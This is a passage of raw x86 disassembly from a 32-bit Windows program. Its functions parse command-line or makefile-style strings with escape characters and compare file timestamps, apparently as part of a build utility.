  403f50:	lea    eax,[ebp-0x4b4]
  403f56:	push   eax
  403f57:	lea    edx,[ebp-0x460]
  403f5d:	call   0x40726d
  403f62:	test   eax,eax
  403f64:	je     0x403f75
  403f66:	lea    ecx,[ebp-0x460]
  403f6c:	call   0x407253
  403f71:	mov    esi,eax
  403f73:	mov    ebx,edx
  403f75:	test   BYTE PTR [edi+0x8],0x1
  403f79:	je     0x403f8d
  403f7b:	mov    eax,ds:0x4114b4
  403f80:	mov    edx,DWORD PTR [edi+0x4]
  403f83:	push   ebx
  403f84:	push   esi
  403f85:	lea    ecx,[eax+eax*1]
  403f88:	call   0x40c542
  403f8d:	lea    eax,[ebp-0x4a0]
  403f93:	push   eax
  403f94:	lea    eax,[ebp-0x488]
  403f9a:	push   eax
  403f9b:	lea    eax,[ebp-0x464]
  403fa1:	push   eax
  403fa2:	lea    eax,[ebp-0x47c]
  403fa8:	push   eax
  403fa9:	lea    eax,[ebp-0x48c]
  403faf:	push   eax
  403fb0:	push   ebx
  403fb1:	push   esi
  403fb2:	push   ecx
  403fb3:	lea    edx,[ebp-0x210]
  403fb9:	mov    ecx,edi
  403fbb:	call   0x40db10
  403fc0:	mov    DWORD PTR [ebp-0x4c4],eax
  403fc6:	test   eax,eax
  403fc8:	je     0x403fe8
  403fca:	cmp    DWORD PTR [ebp-0x490],0x0
  403fd1:	jne    0x403fe8
  403fd3:	mov    edx,DWORD PTR [eax+0xc]
  403fd6:	lea    ecx,[ebp-0x210]
  403fdc:	mov    DWORD PTR ds:0x421efc,ecx
  403fe2:	mov    DWORD PTR [ebp-0x474],edx
  403fe8:	cmp    BYTE PTR ds:0x4216e7,0x0
  403fef:	mov    ecx,DWORD PTR [ebp-0x48c]
  403ff5:	mov    eax,DWORD PTR [edi+0x4]
  403ff8:	mov    edx,DWORD PTR [ebp-0x464]
  403ffe:	mov    DWORD PTR ds:0x421f00,ecx
  404004:	mov    ecx,DWORD PTR [ebp-0x47c]
  40400a:	mov    ds:0x421f04,eax
  40400f:	mov    ds:0x421f08,eax
  404014:	mov    DWORD PTR ds:0x421ef4,ecx
  40401a:	mov    DWORD PTR [ebp-0x468],edx
  404020:	je     0x404028
  404022:	test   BYTE PTR [edi+0x9],0x8
  404026:	je     0x404030
  404028:	test   edx,edx
  40402a:	jne    0x404230
  404030:	cmp    ebx,DWORD PTR [ebp-0x484]
  404036:	jb     0x404079
  404038:	ja     0x404042
  40403a:	cmp    esi,DWORD PTR [ebp-0x488]
  404040:	jb     0x404079
  404042:	cmp    BYTE PTR ds:0x4216e6,0x0
  404049:	je     0x40405b
  40404b:	cmp    esi,DWORD PTR [ebp-0x488]
  404051:	jne    0x40405b
  404053:	cmp    ebx,DWORD PTR [ebp-0x484]
  404059:	je     0x404079
  40405b:	mov    eax,esi
  40405d:	or     eax,ebx
  40405f:	jne    0x40406f
  404061:	mov    eax,DWORD PTR [ebp-0x488]
  404067:	or     eax,DWORD PTR [ebp-0x484]
  40406d:	je     0x404079
  40406f:	test   BYTE PTR [edi+0x8],0x10
  404073:	je     0x40422d
  404079:	cmp    DWORD PTR [ebp-0x490],0x0
  404080:	mov    al,ds:0x432632
  404085:	mov    BYTE PTR [ebp-0x46d],al
  40408b:	mov    BYTE PTR ds:0x432632,0x1
  404092:	je     0x4040d6
  404094:	mov    eax,DWORD PTR [ebp-0x4a0]
  40409a:	test   eax,eax
  40409c:	jne    0x4040a9
  40409e:	test   ecx,ecx
  4040a0:	je     0x4040a7
  4040a2:	mov    eax,DWORD PTR [ecx+0x4]
  4040a5:	jmp    0x4040a9
  4040a7:	xor    eax,eax
  4040a9:	mov    ecx,DWORD PTR [ebp-0x490]
  4040af:	push   eax
  4040b0:	movzx  eax,BYTE PTR [ecx+0x10]
  4040b4:	mov    edx,DWORD PTR [ecx+0x8]
  4040b7:	push   eax
  4040b8:	push   DWORD PTR [ecx+0xc]
  4040bb:	mov    ecx,DWORD PTR [edi+0x4]
  4040be:	call   0x40532b
  4040c3:	mov    edx,DWORD PTR [ebp-0x464]
  4040c9:	add    edx,eax
  4040cb:	mov    DWORD PTR [ebp-0x468],edx
  4040d1:	jmp    0x40418b
  4040d6:	mov    eax,DWORD PTR [ebp-0x474]
  4040dc:	test   eax,eax
  4040de:	je     0x404133
  4040e0:	mov    edx,DWORD PTR [ebp-0x4c4]
  4040e6:	cmp    BYTE PTR [edx+0x14],0x0
  4040ea:	je     0x404107
  4040ec:	test   BYTE PTR ds:0x4114bc,0x40
  4040f3:	jne    0x404107
  4040f5:	push   ecx
  4040f6:	mov    ecx,DWORD PTR [ebp-0x4dc]
  4040fc:	push   edi
  4040fd:	call   0x404851
  404102:	jmp    0x40418b
  404107:	push   DWORD PTR [ebp-0x4a0]
  40410d:	movzx  eax,BYTE PTR [edi+0x8]
  404111:	push   eax
  404112:	push   DWORD PTR [edx+0x10]
  404115:	mov    edx,DWORD PTR [ebp-0x474]
  40411b:	mov    ecx,DWORD PTR [edi+0x4]
  40411e:	call   0x40532b
  404123:	mov    ecx,DWORD PTR [ebp-0x464]
  404129:	add    ecx,eax
  40412b:	mov    DWORD PTR [ebp-0x468],ecx
  404131:	jmp    0x40418b
  404133:	test   BYTE PTR ds:0x4114bc,0x10
  40413a:	je     0x404159
  40413c:	mov    ecx,DWORD PTR [ebp-0x480]
  404142:	test   ecx,ecx
  404144:	je     0x404191
  404146:	push   DWORD PTR [ebp-0x4a0]
  40414c:	movzx  eax,BYTE PTR [ecx+0x10]
  404150:	mov    edx,DWORD PTR [ecx+0x8]
  404153:	push   eax
  404154:	push   DWORD PTR [ecx+0xc]
  404157:	jmp    0x40411b
  404159:	cmp    BYTE PTR [ebp+0xc],0x0
  40415d:	jne    0x404191
  40415f:	mov    eax,esi
  404161:	or     eax,ebx
  404163:	jne    0x40418b
  404165:	cmp    BYTE PTR ds:0x4216e7,al
  40416b:	je     0x404179
  40416d:	mov    DWORD PTR [ebp-0x468],0x1
  404177:	jmp    0x40418b
  404179:	push   DWORD PTR [edi+0x4]
  40417c:	push   0x431
  404181:	push   0x0
  404183:	call   0x405021
  404188:	add    esp,0xc
  40418b:	mov    eax,DWORD PTR [ebp-0x474]
  404191:	cmp    DWORD PTR [ebp-0x490],0x0
  404198:	mov    cl,BYTE PTR [ebp-0x46d]
  40419e:	mov    BYTE PTR ds:0x432632,cl
  4041a4:	jne    0x4041c0
  4041a6:	test   eax,eax
  4041a8:	jne    0x4041c0
  4041aa:	cmp    DWORD PTR ds:0x421ef4,eax
  4041b0:	je     0x4041c0
  4041b2:	mov    eax,DWORD PTR [ebp-0x488]
  4041b8:	mov    ecx,DWORD PTR [ebp-0x484]
  4041be:	jmp    0x4041df
  4041c0:	lea    eax,[ebp-0x4d4]
  4041c6:	push   eax
  4041c7:	call   DWORD PTR ds:0x437308
  4041cd:	mov    eax,DWORD PTR [ebp-0x4d4]
  4041d3:	mov    ecx,DWORD PTR [ebp-0x4d0]
  4041d9:	add    eax,0x2
  4041dc:	adc    ecx,0x0
  4041df:	mov    edx,DWORD PTR [ebp-0x4d8]
  4041e5:	mov    DWORD PTR [ebp-0x494],ecx
  4041eb:	mov    DWORD PTR [ebp-0x478],eax
  4041f1:	test   edx,edx
  4041f3:	je     0x404203
  4041f5:	cmp    DWORD PTR [ebp-0x490],0x0
  4041fc:	je     0x404203
  4041fe:	mov    DWORD PTR [edx],eax
  404200:	mov    DWORD PTR [edx+0x4],ecx
  404203:	mov    edx,DWORD PTR [ebp-0x468]
  404209:	cmp    BYTE PTR ds:0x4216e7,0x0
  404210:	je     0x404275
  404212:	test   edx,edx
  404214:	je     0x404275
  404216:	test   BYTE PTR [edi+0x9],0x8
  40421a:	mov    BYTE PTR ds:0x411020,0x0
  404221:	je     0x40425a
  404223:	push   DWORD PTR [edi+0x4]
  404226:	push   0xfab
  40422b:	jmp    0x40426b
  40422d:	mov    eax,DWORD PTR [edi+0x4]
  404230:	test   BYTE PTR ds:0x4114bc,0x8
  404237:	jne    0x404209
  404239:	cmp    DWORD PTR ds:0x4114b4,0x1
  404240:	jne    0x404209
  404242:	test   BYTE PTR [edi+0x9],0x8
  404246:	jne    0x404209
  404248:	push   eax
  404249:	push   0x2
  40424b:	call   0x4050f7
  404250:	mov    edx,DWORD PTR [ebp-0x464]
  404256:	pop    ecx
  404257:	pop    ecx
  404258:	jmp    0x404209
  40425a:	cmp    DWORD PTR ds:0x4114b4,0x1
  404261:	jne    0x404275
  404263:	push   DWORD PTR [edi+0x4]
  404266:	push   0xfaa
  40426b:	push   0x0
  40426d:	call   0x405021
  404272:	add    esp,0xc
  404275:	test   BYTE PTR ds:0x4114bc,0x8
  40427c:	je     0x4042b0
  40427e:	cmp    DWORD PTR ds:0x4114b4,0x1
  404285:	jne    0x4042b0
  404287:	mov    eax,DWORD PTR [ebp-0x47c]
  40428d:	mov    ebx,DWORD PTR [ebp-0x48c]
  404293:	mov    ecx,eax
  404295:	cmp    eax,ebx
  404297:	je     0x4042a0
  404299:	call   0x4047d9
  40429e:	mov    ecx,ebx
  4042a0:	call   0x4047d9
  4042a5:	mov    eax,ds:0x421ef0
  4042aa:	neg    eax
  4042ac:	sbb    eax,eax
  4042ae:	jmp    0x404323
  4042b0:	and    BYTE PTR [edi+0x9],0xfe
  4042b4:	cmp    DWORD PTR [edi+0x1c],0x0
  4042b8:	mov    al,BYTE PTR [edi+0x9]
  4042bb:	jne    0x4042d4
  4042bd:	or     al,0x2
  4042bf:	cmp    DWORD PTR [ebp-0x468],0x0
  4042c6:	mov    BYTE PTR [edi+0x9],al
  4042c9:	jle    0x4042cf
  4042cb:	or     al,0x4
  4042cd:	jmp    0x4042d1
  4042cf:	and    al,0xfb
  4042d1:	mov    BYTE PTR [edi+0x9],al
  4042d4:	mov    eax,DWORD PTR [ebp-0x494]
  4042da:	cmp    eax,ebx
  4042dc:	jb     0x4042ee
  4042de:	mov    edx,DWORD PTR [ebp-0x478]
  4042e4:	ja     0x4042ea
  4042e6:	cmp    edx,esi
  4042e8:	jbe    0x4042ee
  4042ea:	mov    esi,edx
  4042ec:	mov    ebx,eax
  4042ee:	mov    eax,DWORD PTR [ebp-0x4bc]
  4042f4:	mov    DWORD PTR [edi+0x14],ebx
  4042f7:	mov    DWORD PTR [edi+0x10],esi
  4042fa:	mov    DWORD PTR [eax+0x4],ebx
  4042fd:	mov    ebx,DWORD PTR [ebp-0x48c]
  404303:	mov    DWORD PTR [eax],esi
  404305:	mov    eax,DWORD PTR [ebp-0x47c]
  40430b:	mov    ecx,eax
  40430d:	cmp    eax,ebx
  40430f:	je     0x404318
  404311:	call   0x4047d9
  404316:	mov    ecx,ebx
  404318:	call   0x4047d9
  40431d:	mov    eax,DWORD PTR [ebp-0x468]
  404323:	mov    ecx,DWORD PTR [ebp-0x4]
  404326:	pop    edi
  404327:	pop    esi
  404328:	xor    ecx,ebp
  40432a:	pop    ebx
  40432b:	call   0x40fd0b
  404330:	leave  
  404331:	ret    0x10
  404334:	push   ebp
  404335:	mov    ebp,esp
  404337:	sub    esp,0x28c
  40433d:	mov    eax,ds:0x411018
  404342:	xor    eax,ebp
  404344:	mov    DWORD PTR [ebp-0x4],eax
  404347:	push   ebx
  404348:	xor    eax,eax
  40434a:	push   esi
  40434b:	mov    esi,DWORD PTR [ecx]
  40434d:	mov    ebx,eax
  40434f:	mov    eax,DWORD PTR [ecx+0x4]
  404352:	push   edi
  404353:	mov    DWORD PTR [ebp-0x278],edx
  404359:	mov    DWORD PTR [ebp-0x264],ebx
  40435f:	mov    DWORD PTR [ebp-0x26c],ebx
  404365:	mov    DWORD PTR [ebp-0x28c],eax
  40436b:	mov    DWORD PTR [ebp-0x274],esi
  404371:	test   esi,esi
  404373:	je     0x4046c3
  404379:	mov    DWORD PTR [ebp-0x284],0x5e
  404383:	mov    edi,DWORD PTR [esi+0x4]
  404386:	mov    eax,edi
  404388:	mov    DWORD PTR [ebp-0x280],edi
  40438e:	movzx  ecx,WORD PTR [eax]
  404391:	test   cx,cx
  404394:	je     0x4043df
  404396:	push   0x2
  404398:	pop    edx
  404399:	cmp    cx,0x24
  40439d:	je     0x4043b4
  40439f:	cmp    cx,WORD PTR [ebp-0x284]
  4043a6:	jne    0x4043aa
  4043a8:	add    eax,edx
  4043aa:	add    eax,edx
  4043ac:	movzx  ecx,WORD PTR [eax]
  4043af:	test   cx,cx
  4043b2:	jne    0x404399
  4043b4:	mov    edx,DWORD PTR [ebp-0x278]
  4043ba:	xor    ecx,ecx
  4043bc:	cmp    WORD PTR [eax],cx
  4043bf:	je     0x4043df
  4043c1:	lea    eax,[ebp-0x28c]
  4043c7:	mov    DWORD PTR ds:0x421ef8,edx
  4043cd:	push   eax
  4043ce:	mov    dl,0x1
  4043d0:	mov    ecx,edi
  4043d2:	call   0x40e68f
  4043d7:	mov    edi,eax
  4043d9:	mov    DWORD PTR [ebp-0x280],eax
  4043df:	mov    ecx,edi
  4043e1:	call   0x40dd18
  4043e6:	lea    edx,[ebp-0x268]
  4043ec:	lea    ecx,[ebp-0x270]
  4043f2:	mov    DWORD PTR [ebp-0x288],eax
  4043f8:	mov    DWORD PTR [ebp-0x270],eax
  4043fe:	call   0x4046d4
  404403:	test   al,al
  404405:	je     0x404699
  40440b:	mov    esi,DWORD PTR [ebp-0x268]
  404411:	xor    ecx,ecx
  404413:	cmp    WORD PTR [esi],0x7b
  404417:	mov    edi,esi
  404419:	jne    0x404447
  40441b:	push   0x2
  40441d:	pop    edx
  40441e:	push   0x5e
  404420:	pop    ebx
  404421:	movzx  eax,WORD PTR [edi]
  404424:	cmp    eax,0x7d
  404427:	je     0x404437
  404429:	cmp    ax,bx
  40442c:	jne    0x404430
  40442e:	add    edi,edx
  404430:	add    edi,edx
  404432:	cmp    WORD PTR [edi],cx
  404435:	jne    0x404421
  404437:	cmp    WORD PTR [edi],cx
  40443a:	je     0x40444f
  40443c:	xor    eax,eax
  40443e:	mov    WORD PTR [edi],ax
  404441:	add    edi,edx
  404443:	add    esi,edx
  404445:	jmp    0x404449
  404447:	mov    esi,ecx
  404449:	mov    DWORD PTR [ebp-0x268],esi
  40444f:	mov    BYTE PTR [ebp-0x259],cl
  404455:	mov    DWORD PTR [ebp-0x254],ecx
  40445b:	mov    DWORD PTR [ebp-0x250],ecx
  404461:	mov    DWORD PTR [ebp-0x244],ecx
  404467:	mov    DWORD PTR [ebp-0x240],ecx
  40446d:	mov    ecx,edi
  40446f:	call   0x40dd18
  404474:	mov    ebx,eax
  404476:	push   0x401088
  40447b:	push   edi
  40447c:	mov    DWORD PTR [ebp-0x260],ebx
  404482:	call   DWORD PTR ds:0x437544
  404488:	pop    ecx
  404489:	pop    ecx
  40448a:	test   eax,eax
  40448c:	jne    0x404492
  40448e:	test   esi,esi
  404490:	je     0x4044d7
  404492:	lea    eax,[ebp-0x27c]
  404498:	push   eax
  404499:	lea    eax,[ebp-0x258]
  40449f:	push   eax
  4044a0:	mov    edx,edi
  4044a2:	mov    ecx,esi
  4044a4:	call   0x407418
  4044a9:	mov    esi,eax
  4044ab:	test   esi,esi
  4044ad:	je     0x4044d7
  4044af:	push   ebx
  4044b0:	mov    BYTE PTR [ebp-0x259],0x1
  4044b7:	call   DWORD PTR ds:0x43754c
  4044bd:	pop    ecx
  4044be:	lea    edx,[ebp-0x22c]
  4044c4:	mov    ecx,esi
  4044c6:	mov    edi,esi
  4044c8:	call   0x40f26d
  4044cd:	mov    esi,eax
  4044cf:	mov    DWORD PTR [ebp-0x260],esi
  4044d5:	jmp    0x4044dd
  4044d7:	mov    esi,DWORD PTR [ebp-0x260]
  4044dd:	push   0x10
  4044df:	pop    ecx
  4044e0:	call   0x40a320
  4044e5:	push   0x20
  4044e7:	push   esi
  4044e8:	mov    ebx,eax
  4044ea:	call   DWORD PTR ds:0x437540
  4044f0:	pop    ecx
  4044f1:	pop    ecx
  4044f2:	test   eax,eax
  4044f4:	je     0x404571
  4044f6:	push   0x22
  4044f8:	push   esi
  4044f9:	call   DWORD PTR ds:0x437540
  4044ff:	pop    ecx
  404500:	pop    ecx
  404501:	test   eax,eax
  404503:	jne    0x404571
  404505:	lea    ecx,[esi+0x2]
  404508:	xor    edx,edx
  40450a:	mov    ax,WORD PTR [esi]
  40450d:	add    esi,0x2
  404510:	cmp    ax,dx
  404513:	jne    0x40450a
  404515:	sub    esi,ecx
  404517:	sar    esi,1
  404519:	add    esi,0x3
  40451c:	xor    ecx,ecx
  40451e:	push   0x2
  404520:	pop    edx
  404521:	mov    eax,esi
  404523:	mul    edx
  404525:	seto   cl
  404528:	neg    ecx
  40452a:	or     ecx,eax
  40452c:	call   0x40a2fb
  404531:	push   0x401098
  404536:	push   esi
  404537:	push   eax
  404538:	mov    DWORD PTR [ebx+0x4],eax
  40453b:	call   DWORD PTR ds:0x4373d0
  404541:	add    esp,0xc
  404544:	push   DWORD PTR [ebp-0x260]
  40454a:	push   esi
  40454b:	push   DWORD PTR [ebx+0x4]
  40454e:	call   DWORD PTR ds:0x4373d4
  404554:	add    esp,0xc
  404557:	push   0x401098
  40455c:	push   esi
  40455d:	push   DWORD PTR [ebx+0x4]
  404560:	call   DWORD PTR ds:0x4373d4
  404566:	mov    esi,DWORD PTR [ebp-0x260]
  40456c:	add    esp,0xc
  40456f:	jmp    0x40457b
  404571:	mov    ecx,esi
  404573:	call   0x40dd18
  404578:	mov    DWORD PTR [ebx+0x4],eax
  40457b:	cmp    BYTE PTR ds:0x4216e5,0x0
  404582:	je     0x4045a1
  404584:	lea    eax,[ebp-0x27c]
  40458a:	push   eax
  40458b:	lea    edx,[ebp-0x258]
  404591:	mov    ecx,esi
  404593:	call   0x40726d
  404598:	test   eax,eax
  40459a:	jne    0x4045a1
  40459c:	mov    DWORD PTR [ebx+0xc],eax
  40459f:	jmp    0x4045af
  4045a1:	lea    ecx,[ebp-0x258]
  4045a7:	call   0x407253
  4045ac:	mov    DWORD PTR [ebx+0xc],edx
  4045af:	cmp    BYTE PTR ds:0x4216e5,0x0
  4045b6:	mov    ecx,DWORD PTR [ebp-0x264]
  4045bc:	mov    DWORD PTR [ebx+0x8],eax
  4045bf:	je     0x404601
  4045c1:	mov    edx,ecx
  4045c3:	mov    eax,ecx
  4045c5:	test   ecx,ecx
  4045c7:	je     0x4045f9
  4045c9:	mov    ecx,DWORD PTR [ebx+0x8]
  4045cc:	mov    esi,DWORD PTR [ebx+0xc]
  4045cf:	cmp    esi,DWORD PTR [eax+0xc]
  4045d2:	ja     0x4045e3
  4045d4:	jb     0x4045db
  4045d6:	cmp    ecx,DWORD PTR [eax+0x8]
  4045d9:	ja     0x4045e3
  4045db:	mov    edx,eax
  4045dd:	mov    eax,DWORD PTR [eax]
  4045df:	test   eax,eax
  4045e1:	jne    0x4045cf
  4045e3:	mov    esi,DWORD PTR [ebp-0x260]
  4045e9:	cmp    edx,eax
  4045eb:	je     0x4045f9
  4045ed:	mov    DWORD PTR [edx],ebx
  4045ef:	mov    DWORD PTR [ebx],eax
  4045f1:	mov    ebx,DWORD PTR [ebp-0x264]
  4045f7:	jmp    0x40461f
  4045f9:	mov    DWORD PTR [ebp-0x26c],ebx
  4045ff:	jmp    0x404619
  404601:	lea    eax,[ebp-0x26c]
  404607:	jmp    0x40460d
  404609:	mov    eax,ecx
  40460b:	mov    ecx,DWORD PTR [eax]
  40460d:	test   ecx,ecx
  40460f:	jne    0x404609
  404611:	mov    DWORD PTR [eax],ebx
  404613:	mov    ebx,DWORD PTR [ebp-0x26c]
  404619:	mov    DWORD PTR [ebp-0x264],ebx
  40461f:	push   esi
  404620:	call   DWORD PTR ds:0x43754c
  404626:	cmp    BYTE PTR [ebp-0x259],0x0
  40462d:	pop    ecx
  40462e:	je     0x404674
  404630:	push   0x401088
  404635:	push   edi
  404636:	call   DWORD PTR ds:0x437544
  40463c:	pop    ecx
  40463d:	pop    ecx
  40463e:	test   eax,eax
  404640:	je     0x404674
  404642:	mov    edx,DWORD PTR [ebp-0x27c]
  404648:	lea    ecx,[ebp-0x258]
  40464e:	call   0x4073f5
  404653:	test   eax,eax
  404655:	je     0x404674
  404657:	lea    edx,[ebp-0x22c]
  40465d:	mov    ecx,edi
  40465f:	call   0x40f26d
  404664:	mov    esi,eax
  404666:	mov    DWORD PTR [ebp-0x260],esi
  40466c:	test   esi,esi
  40466e:	jne    0x4044dd
  404674:	lea    edx,[ebp-0x268]
  40467a:	lea    ecx,[ebp-0x270]
  404680:	call   0x4046d4
  404685:	test   al,al
  404687:	jne    0x40440b
  40468d:	mov    esi,DWORD PTR [ebp-0x274]
  404693:	mov    edi,DWORD PTR [ebp-0x280]
  404699:	cmp    edi,DWORD PTR [esi+0x4]
  40469c:	je     0x4046a6
  40469e:	push   edi
  40469f:	call   DWORD PTR ds:0x43754c
  4046a5:	pop    ecx
  4046a6:	push   DWORD PTR [ebp-0x288]
  4046ac:	call   DWORD PTR ds:0x43754c
  4046b2:	mov    esi,DWORD PTR [esi]
  4046b4:	pop    ecx
  4046b5:	mov    DWORD PTR [ebp-0x274],esi
  4046bb:	test   esi,esi
  4046bd:	jne    0x404383
  4046c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4046c6:	pop    edi
  4046c7:	pop    esi
  4046c8:	mov    eax,ebx
  4046ca:	xor    ecx,ebp
  4046cc:	pop    ebx
  4046cd:	call   0x40fd0b
  4046d2:	leave  
  4046d3:	ret    
  4046d4:	push   ebp
  4046d5:	mov    ebp,esp
  4046d7:	push   ecx
  4046d8:	push   ebx
  4046d9:	push   esi
  4046da:	push   edi
  4046db:	push   0x20
  4046dd:	pop    edi
  4046de:	mov    ebx,ecx
  4046e0:	push   0x2
  4046e2:	mov    esi,DWORD PTR [ebx]
  4046e4:	mov    DWORD PTR [ebp-0x4],0x9
  4046eb:	pop    ecx
  4046ec:	jmp    0x4046fb
  4046ee:	cmp    ax,di
  4046f1:	je     0x4046f9
  4046f3:	cmp    ax,WORD PTR [ebp-0x4]
  4046f7:	jne    0x404703
  4046f9:	add    esi,ecx
  4046fb:	movzx  eax,WORD PTR [esi]
  4046fe:	test   ax,ax
  404701:	jne    0x4046ee
  404703:	movzx  eax,WORD PTR [esi]
  404706:	mov    DWORD PTR [edx],esi
  404708:	test   ax,ax
  40470b:	jne    0x404714
  40470d:	xor    al,al
  40470f:	jmp    0x4047d4
  404714:	push   0x22
  404716:	mov    DWORD PTR [edx],esi
  404718:	pop    edx
  404719:	cmp    ax,dx
  40471c:	jne    0x404748
  40471e:	xor    edi,edi
  404720:	test   ax,ax
  404723:	je     0x404734
  404725:	add    esi,ecx
  404727:	movzx  eax,WORD PTR [esi]
  40472a:	cmp    ax,dx
  40472d:	jne    0x40471e
  40472f:	cmp    WORD PTR [esi],di
  404732:	jne    0x404744
  404734:	push   0x40e
  404739:	push   edi
  40473a:	call   0x405021
  40473f:	pop    ecx
  404740:	pop    ecx
  404741:	push   0x2
  404743:	pop    ecx
  404744:	add    esi,ecx
  404746:	jmp    0x4047c4
  404748:	xor    edi,edi
  40474a:	cmp    eax,0x7b
  40474d:	jne    0x4047a7
  40474f:	add    esi,ecx
  404751:	cmp    WORD PTR [esi],dx
  404754:	jne    0x404767
  404756:	add    esi,ecx
  404758:	movzx  eax,WORD PTR [esi]
  40475b:	test   ax,ax
  40475e:	je     0x404767
  404760:	add    esi,ecx
  404762:	cmp    ax,dx
  404765:	jne    0x404758
  404767:	movzx  eax,WORD PTR [esi]
  40476a:	cmp    eax,0x7d
  40476d:	je     0x404774
  40476f:	test   ax,ax
  404772:	jne    0x40474f
  404774:	cmp    WORD PTR [esi],di
  404777:	jne    0x40478c
  404779:	push   0x423
  40477e:	push   edi
  40477f:	call   0x405021
  404784:	pop    ecx
  404785:	pop    ecx
  404786:	push   0x2
  404788:	pop    ecx
  404789:	push   0x22
  40478b:	pop    edx
  40478c:	add    esi,ecx
  40478e:	movzx  eax,WORD PTR [esi]
  404791:	cmp    ax,dx
  404794:	jne    0x4047a7
  404796:	test   ax,ax
  404799:	je     0x404734
  40479b:	add    esi,ecx
  40479d:	movzx  eax,WORD PTR [esi]
  4047a0:	cmp    ax,dx
  4047a3:	jne    0x404796
  4047a5:	jmp    0x40472f
  4047a7:	test   ax,ax
  4047aa:	je     0x4047c4
  4047ac:	push   0x20
  4047ae:	pop    edx
  4047af:	movzx  eax,WORD PTR [esi]
  4047b2:	cmp    ax,dx
  4047b5:	je     0x4047c4
  4047b7:	cmp    ax,WORD PTR [ebp-0x4]
  4047bb:	je     0x4047c4
  4047bd:	add    esi,ecx
  4047bf:	cmp    WORD PTR [esi],di
  4047c2:	jne    0x4047af
  4047c4:	cmp    WORD PTR [esi],di
  4047c7:	je     0x4047d0
  4047c9:	xor    eax,eax
  4047cb:	mov    WORD PTR [esi],ax
  4047ce:	add    esi,ecx
  4047d0:	mov    DWORD PTR [ebx],esi
  4047d2:	mov    al,0x1
  4047d4:	pop    edi
  4047d5:	pop    esi
  4047d6:	pop    ebx
  4047d7:	leave  
  4047d8:	ret    
  4047d9:	push   esi
  4047da:	mov    esi,ecx
  4047dc:	push   edi
  4047dd:	mov    edi,ecx
  4047df:	test   esi,esi
  4047e1:	je     0x404807
  4047e3:	push   ebx
  4047e4:	mov    ebx,DWORD PTR ds:0x43265c
  4047ea:	push   DWORD PTR [edi+0x4]
  4047ed:	mov    esi,DWORD PTR [esi]
  4047ef:	call   DWORD PTR ds:0x43754c
  4047f5:	mov    DWORD PTR [edi],ebx
  4047f7:	mov    ebx,edi
  4047f9:	pop    ecx
  4047fa:	mov    edi,esi
  4047fc:	test   esi,esi
  4047fe:	jne    0x4047ea
  404800:	mov    DWORD PTR ds:0x43265c,ebx
  404806:	pop    ebx
  404807:	pop    edi
  404808:	pop    esi
  404809:	ret    
  40480a:	push   ebx
  40480b:	push   esi
  40480c:	push   edi
  40480d:	push   0x20
  40480f:	mov    esi,ecx
  404811:	pop    ecx
  404812:	mov    bl,dl
  404814:	call   0x40a320
  404819:	mov    ecx,esi
  40481b:	mov    edi,eax
  40481d:	call   0x40dd18
  404822:	mov    DWORD PTR [edi+0x4],eax
  404825:	xor    eax,eax
  404827:	push   ecx
  404828:	mov    ecx,esi
  40482a:	mov    BYTE PTR [edi+0x8],bl
  40482d:	mov    BYTE PTR [edi+0x9],al
  404830:	mov    DWORD PTR [edi+0x10],eax
  404833:	mov    DWORD PTR [edi+0x14],eax
  404836:	mov    DWORD PTR [edi+0x18],eax
  404839:	call   0x40de1d
  40483e:	lea    ecx,[eax*4+0x4214c0]
  404845:	mov    eax,DWORD PTR [ecx]
  404847:	mov    DWORD PTR [edi],eax
  404849:	mov    DWORD PTR [ecx],edi
  40484b:	mov    eax,edi
  40484d:	pop    edi
  40484e:	pop    esi
  40484f:	pop    ebx
  404850:	ret    
  404851:	push   ebp
  404852:	mov    ebp,esp
  404854:	push   ecx
  404855:	push   ebx
  404856:	push   esi
  404857:	push   edi
  404858:	mov    edi,ecx
  40485a:	mov    eax,edx
  40485c:	mov    esi,DWORD PTR [edi]
  40485e:	xor    ebx,ebx
  404860:	mov    DWORD PTR [ebp-0x4],eax
  404863:	test   esi,esi
  404865:	je     0x404885
  404867:	mov    ecx,DWORD PTR [ebp+0x8]
  40486a:	cmp    DWORD PTR [esi+0x4],eax
  40486d:	jne    0x404879
  40486f:	mov    al,BYTE PTR [esi+0x8]
  404872:	cmp    al,BYTE PTR [ecx+0x8]
  404875:	je     0x404881
  404877:	mov    eax,edx
  404879:	mov    ebx,esi
  40487b:	mov    esi,DWORD PTR [esi]
  40487d:	test   esi,esi
  40487f:	jne    0x40486a
  404881:	test   esi,esi
  404883:	jne    0x4048b2
  404885:	push   0x14
  404887:	pop    ecx
  404888:	call   0x40a320
  40488d:	mov    esi,eax
  40488f:	mov    eax,DWORD PTR [ebp-0x4]
  404892:	mov    DWORD PTR [esi+0x4],eax
  404895:	mov    eax,DWORD PTR [ebp+0x8]
  404898:	mov    cl,BYTE PTR [eax+0x8]
  40489b:	mov    BYTE PTR [esi+0x8],cl
  40489e:	test   ebx,ebx
  4048a0:	je     0x4048a6
  4048a2:	mov    DWORD PTR [ebx],esi
  4048a4:	jmp    0x4048b2
  4048a6:	mov    eax,DWORD PTR [edi]
  4048a8:	test   eax,eax
  4048aa:	je     0x4048b0
  4048ac:	mov    DWORD PTR [eax],esi
  4048ae:	jmp    0x4048b2
  4048b0:	mov    DWORD PTR [edi],esi
  4048b2:	call   0x40dcc8
  4048b7:	mov    ebx,DWORD PTR [ebp+0x8]
  4048ba:	mov    DWORD PTR [ebp-0x4],eax
  4048bd:	mov    ecx,DWORD PTR [ebx+0x4]
  4048c0:	call   0x40dd18
  4048c5:	mov    ecx,DWORD PTR [ebp-0x4]
  4048c8:	lea    edx,[esi+0xc]
  4048cb:	mov    DWORD PTR [ecx+0x4],eax
  4048ce:	jmp    0x4048d2
  4048d0:	mov    edx,ecx
  4048d2:	mov    ecx,DWORD PTR [edx]
  4048d4:	test   ecx,ecx
  4048d6:	jne    0x4048d0
  4048d8:	mov    eax,DWORD PTR [ebp-0x4]
  4048db:	mov    DWORD PTR [edx],eax
  4048dd:	call   0x40dcc8
  4048e2:	mov    ecx,DWORD PTR ds:0x421efc
  4048e8:	mov    DWORD PTR [ebp+0x8],eax
  4048eb:	call   0x40dd18
  4048f0:	mov    edx,DWORD PTR [ebp+0x8]
  4048f3:	add    esi,0x10
  4048f6:	mov    DWORD PTR [edx+0x4],eax
  4048f9:	jmp    0x4048fd
  4048fb:	mov    esi,ecx
  4048fd:	mov    ecx,DWORD PTR [esi]
  4048ff:	test   ecx,ecx
  404901:	jne    0x4048fb
  404903:	mov    DWORD PTR [esi],edx
  404905:	mov    DWORD PTR [ebx+0x1c],edi
  404908:	pop    edi
  404909:	pop    esi
